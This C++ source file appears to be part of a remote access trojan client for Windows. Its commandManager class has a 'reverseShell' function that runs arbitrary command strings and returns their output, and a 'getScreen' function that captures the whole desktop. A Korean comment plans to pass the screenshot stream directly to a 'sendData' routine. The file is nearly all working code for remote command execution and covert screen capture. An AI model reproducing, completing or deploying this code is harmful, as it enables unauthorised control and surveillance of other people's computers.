#include <Windows.h>
#include <iostream>
#include <ole2.h>
#include <olectl.h>
#include "commandManager.h"
#include "DDproto.h"

commandManager::commandManager() {
}

std::string commandManager::reverseShell(const char * cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL)
            result += buffer;
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}


/* 화면 스샷 구현용 WriteFile 삭제하고 Stream을 바로 sendData로 넘겨줘야할듯*/
bool commandManager::getScreen(LPCSTR fname) {
    {
        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        HDC hdcSource = GetDC(NULL);
        HDC hdcMemory = CreateCompatibleDC(hdcSource);

        int capX = GetDeviceCaps(hdcSource, HORZRES);
        int capY = GetDeviceCaps(hdcSource, VERTRES);

        HBITMAP hBitmap = CreateCompatibleBitmap(hdcSource, w, h);

        HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);

        BitBlt(hdcMemory, 0, 0, w, h, hdcSource, 0, 0, SRCCOPY);

        hBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmapOld);

        DeleteDC(hdcSource);
        DeleteDC(hdcMemory);

        HPALETTE hpal = NULL;

        bool result = false;
        PICTDESC pd;

        pd.cbSizeofstruct = sizeof(PICTDESC);
        pd.picType = PICTYPE_BITMAP;
        pd.bmp.hbitmap = hBitmap;
        pd.bmp.hpal = hpal;

        LPPICTURE picture;
        HRESULT res = OleCreatePictureIndirect(&pd, IID_IPicture, false,
            reinterpret_cast<void**>(&picture));

        if (!SUCCEEDED(res))
            return false;

        LPSTREAM stream;
        res = CreateStreamOnHGlobal(0, true, &stream);

        if (!SUCCEEDED(res))
        {
            picture->Release();
            return false;
        }

        LONG bytes_streamed;
        res = picture->SaveAsFile(stream, true, &bytes_streamed);

        HANDLE file = CreateFileA(fname, GENERIC_WRITE, FILE_SHARE_READ, 0,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

        if (!SUCCEEDED(res) || !file)
        {
            stream->Release();
            picture->Release();
            return false;
        }

        HGLOBAL mem = 0;
        GetHGlobalFromStream(stream, &mem);
        LPVOID data = GlobalLock(mem);

        DWORD bytes_written;

        result = !!WriteFile(file, data, bytes_streamed, &bytes_written, 0);
        result &= (bytes_written == static_cast<DWORD>(bytes_streamed));

        GlobalUnlock(mem);
        CloseHandle(file);

        stream->Release();
        picture->Release();

        return result;
    }
}
